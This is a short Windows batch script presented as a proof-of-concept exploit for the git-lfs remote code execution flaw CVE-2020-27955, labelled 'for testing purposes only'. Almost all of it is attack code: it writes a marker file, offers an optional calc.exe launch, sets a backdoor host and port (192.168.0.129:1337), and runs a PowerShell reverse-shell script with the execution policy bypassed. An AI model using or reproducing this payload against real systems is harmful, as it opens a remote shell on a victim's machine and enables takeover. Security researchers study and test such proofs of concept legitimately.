::
:: git-lfs Remote Code Execution (RCE) exploit CVE-2020-27955
:: by Dawid Golunski
:: 
:: https://legalhackers.com
:: https://exploitbox.io
::
::
::
:: * For testing purposes only *
::


:: Create a test file
echo hacked
echo hacked > GITHACKED

:: uncomment below if you just want to pop an innocent calc :)
:: calc.exe

:: Reverse Shell - Change backdoor HOST and PORT if needed. 
SET BACKDOOR_HOST "192.168.0.129"
SET BACKDOOR_PORT "1337"

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass .\revsh_powersh.ps1

